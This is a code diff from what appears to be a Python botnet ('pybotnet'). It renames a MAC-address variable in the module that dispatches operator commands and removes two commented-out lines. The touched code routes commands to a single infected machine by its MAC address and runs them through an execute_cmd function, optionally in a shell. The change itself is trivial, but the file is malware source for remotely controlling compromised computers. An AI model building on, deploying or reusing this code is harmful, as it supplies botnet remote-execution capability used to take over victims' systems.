@@ -12,10 +12,12 @@ from requests import get
 # pybotnet import
 from . import util
 from . import settings
-mac_addres = str(get_system_mac_addres())
+
+
+MAC_ADDRES = str(get_system_mac_addres())
 
 scripts_name = {
-    mac_addres: "`<system mac_addres> <command>`: run command on one target",
+    MAC_ADDRES: "`<system MAC_ADDRES> <command>`: run command on one target",
 
     "do_sleep": "`do_sleep <scconds> <message>`: print message and sleep",
 
@@ -35,8 +37,6 @@ scripts_name = {
 
     "/start": "`/start`: run `help` command!"
 }
-
-# "import_file": "import_file <route>"
 
 
 def split_command(command: str) -> list:
@@ -61,7 +61,7 @@ def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
     try:
         if is_command(command):
 
-            if command_name == mac_addres:
+            if command_name == MAC_ADDRES:
                 '''run command just in this system'''
                 logger.info('delete mac addres and run command ')
                 new_command = ' '.join(split_command(command)[1:])
@@ -140,7 +140,6 @@ def get_info(pybotnet_up_time, logger):
 def execute_cmd(command, is_shell: bool, logger) -> str:
     try:
         command = split_command(command)
-        # command = ' '.join(command[1:])
         command = command[1:]
 
     except exception as error:
